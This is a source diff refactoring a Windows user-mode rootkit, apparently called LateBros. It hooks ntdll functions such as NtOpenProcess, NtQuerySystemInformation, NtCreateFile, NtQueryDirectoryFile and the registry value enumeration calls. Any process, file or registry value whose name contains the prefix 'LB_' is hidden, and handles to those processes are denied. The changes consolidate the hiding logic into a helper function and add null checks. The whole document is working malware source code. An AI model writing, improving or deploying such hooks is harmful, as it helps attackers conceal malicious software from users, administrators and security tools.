@@ -1,7 +1,20 @@
 ﻿#include "stdafx.h"
 #include "detour.hpp"
+#include <string_view>
 
 constexpr static auto ROOTKIT_PREFIX = L"LB_";
+
+inline bool is_protected_entry(const wchar_t* str, std::size_t len) noexcept
+{
+	const std::wstring_view sv(str, len);
+	
+	return sv.find(ROOTKIT_PREFIX) != std::wstring_view::npos;
+}
+
+inline bool is_protected_entry(const UNICODE_STRING& uni_str) noexcept
+{
+	return is_protected_entry(uni_str.Buffer, uni_str.Length / sizeof(wchar_t));
+}
 
 /*
  * Function: ntdll!NtOpenProcess
@@ -25,14 +38,12 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntop(PHANDLE out_handle, ACCESS_
 	if (!NT_SUCCESS(status))
 		return status;
 
-	std::wstring name_buffer;
-	name_buffer.resize(MAX_PATH);
-	const auto len = GetModuleBaseNameW(*out_handle, nullptr, name_buffer.data(), MAX_PATH);
+	wchar_t name_buffer[MAX_PATH];
+	const auto len = GetModuleBaseNameW(*out_handle, nullptr, name_buffer, MAX_PATH);
 	if (len)
 	{
-		name_buffer.resize(len);
 		// 'INFECTED' PROCESS IS TRYING TO OPEN A HANDLE TO A LATEBROS PROCESS
-		if (name_buffer.find(ROOTKIT_PREFIX) != std::wstring::npos)
+		if (is_protected_entry(name_buffer, len))
 		{
 			CloseHandle(*out_handle);			// CLOSE HANDLE TO ENSURE IT WON'T BE USED REGARDLESS OF SANITY CHECKS
 			*out_handle = nullptr;				// ERASE PASSED HANLDE
@@ -68,7 +79,7 @@ extern "C" NTSTATUS __declspec(dllexport) WINAPI qsi(SYSTEM_INFORMATION_CLASS sy
 	// PREVENT BRUTEFORCE
 	if (system_information_class == static_cast<_SYSTEM_INFORMATION_CLASS>(0x58)/*SystemProcessIdInformation*/)
 	{
-    const auto process_id = *static_cast<uint64_t*>(system_information);
+    	const auto process_id = *static_cast<uint64_t*>(system_information);
 
 		// REMOVE HOOKS IN CASE PROCESS ID IS PROTECTED
 		const auto function_pointer = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleA("ntdll"), "NtOpenProcess"));
@@ -83,14 +94,12 @@ extern "C" NTSTATUS __declspec(dllexport) WINAPI qsi(SYSTEM_INFORMATION_CLASS sy
 		detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntop));
 
 		if (handle) {
-			std::wstring name_buffer;
-			name_buffer.resize(MAX_PATH);
-			const auto len = GetModuleBaseNameW(handle, nullptr, name_buffer.data(), MAX_PATH);
+			wchar_t name_buffer[MAX_PATH];
+			const auto len = GetModuleBaseNameW(handle, nullptr, name_buffer, MAX_PATH);
 			if (len)
 			{
-				name_buffer.resize(len);
 				// 'INFECTED' PROCESS IS TRYING TO OPEN A HANDLE TO A LATEBROS PROCESS
-				if (name_buffer.find(ROOTKIT_PREFIX) != std::wstring::npos)
+				if (is_protected_entry(name_buffer, len))
 					return STATUS_INVALID_CID; // RETURN INVALID CLIENT_ID
 			}
 
@@ -123,17 +132,11 @@ extern "C" NTSTATUS __declspec(dllexport) WINAPI qsi(SYSTEM_INFORMATION_CLASS sy
 
 		while (entry->NextEntryOffset)
 		{
-			if (entry->ImageName.Buffer)
+			if (entry->ImageName.Buffer && is_protected_entry(entry->ImageName))
 			{
-				// SKIP PROTECTED ENTRIES
-				std::wstring name(entry->ImageName.Buffer, entry->ImageName.Length / sizeof(wchar_t));
-				if (name.find(ROOTKIT_PREFIX) != std::wstring::npos)
-				{
-					previous_entry->NextEntryOffset += entry->NextEntryOffset;	// MAKE PREVIOUS ENTRY POINT TO THE NEXT ENTRY
-					ZeroMemory(entry, entry->NextEntryOffset);					// CLEAR OUR ENTRY, WHY NOT?
-				}
+				previous_entry->NextEntryOffset += entry->NextEntryOffset;	// MAKE PREVIOUS ENTRY POINT TO THE NEXT ENTRY
+				ZeroMemory(entry, entry->NextEntryOffset);					// CLEAR OUR ENTRY, WHY NOT?
 			}
-
 
 			previous_entry = entry;
 			entry = reinterpret_cast<_SYSTEM_PROCESS_INFO*>(reinterpret_cast<uintptr_t>(entry) + entry->NextEntryOffset);
@@ -155,13 +158,8 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntcr(
 	ULONG create_options, PVOID ea_buffer, ULONG ea_length)
 {
 	if (object_attributes && object_attributes->ObjectName && object_attributes->ObjectName->Buffer)
-	{
-		// UNICODE_STRING is not null terminated
-		std::wstring file_name(object_attributes->ObjectName->Buffer, object_attributes->ObjectName->Length / sizeof(wchar_t));
-
-		if (file_name.find(ROOTKIT_PREFIX) != std::wstring::npos)
+		if(is_protected_entry(*object_attributes->ObjectName))
 			return STATUS_NOT_FOUND;
-	}
 
 	const auto function_pointer = reinterpret_cast<uintptr_t>(NtCreateFile);
 
@@ -186,13 +184,8 @@ extern "C" char __declspec(dllexport) ntopf_og[0xF] = {}; // ORIGINAL BYTES
 extern "C" NTSTATUS __declspec(dllexport) NTAPI ntopf(PHANDLE file_handle, ACCESS_MASK desired_access, POBJECT_ATTRIBUTES object_attributes, PIO_STATUS_BLOCK io_status_block, ULONG share_access, ULONG open_options)
 {
 	if (object_attributes && object_attributes->ObjectName && object_attributes->ObjectName->Buffer)
-	{
-		// UNICODE_STRING is not null terminated
-		std::wstring file_name(object_attributes->ObjectName->Buffer, object_attributes->ObjectName->Length / sizeof(wchar_t));
-
-		if (file_name.find(ROOTKIT_PREFIX) != std::wstring::npos)
+		if(is_protected_entry(*object_attributes->ObjectName))
 			return STATUS_NOT_FOUND;
-	}
 
 	const auto function_pointer = reinterpret_cast<uintptr_t>(NtOpenFile);
 
@@ -245,11 +238,9 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntqdf(HANDLE file_handle, HANDLE
 
 			while (current_entry->next_entry_offset)
 			{
-				const std::wstring file_name = current_entry->file_name;
-				if (file_name.find(ROOTKIT_PREFIX) != std::wstring::npos)
-				{
+				const std::wstring_view file_name = current_entry->file_name;
+				if (file_name.find(ROOTKIT_PREFIX) != std::wstring_view::npos)
 					previous_entry->next_entry_offset += current_entry->next_entry_offset;	// SKIP
-				}
 
 				previous_entry = current_entry;
 				current_entry = reinterpret_cast<FILE_OLE_DIR_INFORMATION*>(reinterpret_cast<uintptr_t>(current_entry) + current_entry->next_entry_offset);
@@ -268,8 +259,10 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntqdf(HANDLE file_handle, HANDLE
 extern "C" char __declspec(dllexport) ntdvk_og[0xF] = {}; // ORIGINAL BYTES
 extern "C" NTSTATUS __declspec(dllexport) NTAPI ntdvk(HANDLE key_handle, PUNICODE_STRING value_name)
 {
-	std::wstring name(value_name->Buffer, value_name->Length / sizeof(wchar_t));
-	if (name.find(ROOTKIT_PREFIX) != std::wstring::npos) // PROTECTED ENTRY
+	if(!value_name)
+		return STATUS_INVALID_PARAMETER;
+	
+	if(!value_name->Buffer || is_protected_entry(*value_name))
 		return STATUS_OBJECT_NAME_NOT_FOUND;
 
 	auto function_pointer = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleA("ntdll"), "NtDeleteValueKey"));
@@ -333,14 +326,13 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntevk(HANDLE key_handle, ULONG i
 	}
 	
 	// UPDATE THE INDEX TO BE AFTER THE VALUE WE REPLACED HIDDEN KEYS WITH
-	if (index <= last_replaced)
+	if (static_cast<int>(index) <= last_replaced)
 	{
 		index = last_replaced + 1;
 		++last_replaced;
 	}
 
-	NTSTATUS     result;
-	std::wstring name;
+	NTSTATUS result;
 	while (true)
 	{
 		// CALL	
@@ -354,21 +346,23 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntevk(HANDLE key_handle, ULONG i
 			break;
 		}
 
+		std::wstring_view sv;
 		if (key_value_class == KEY_VALUE_INFORMATION_CLASS::KeyValueFullInformation)
 		{
 			auto data = static_cast<KEY_VALUE_FULL_INFORMATION*>(key_value_info);
-			name	  = std::wstring(data->Name, data->NameLength / sizeof(wchar_t));
+			sv        = std::wstring_view(data->Name, data->NameLength / sizeof(wchar_t));
 		}
 		else if (key_value_class == KEY_VALUE_INFORMATION_CLASS::KeyValueBasicInformation)
 		{
 			auto data = static_cast<KEY_VALUE_BASIC_INFORMATION*>(key_value_info);
-			name 	  = std::wstring(data->Name, data->NameLength / sizeof(wchar_t));
+			sv        = std::wstring_view(data->Name, data->NameLength / sizeof(wchar_t));
 		}
 		else // PARTIAL INFORMATION DOESN'T CONTAIN THE NAME SO WE DONT REALLY CARE ABOUT IT
 			break;
 
 		// IF NOTHING IS FOUND WE BREAK OUT OF THE LOOP
-		if (name.find(ROOTKIT_PREFIX) == std::wstring::npos)
+
+		if (sv.find(ROOTKIT_PREFIX) == std::wstring_view::npos)
 		{
 			// UPDATE THE INDEX OF LAST REPLACEMENT
 			last_replaced = index;
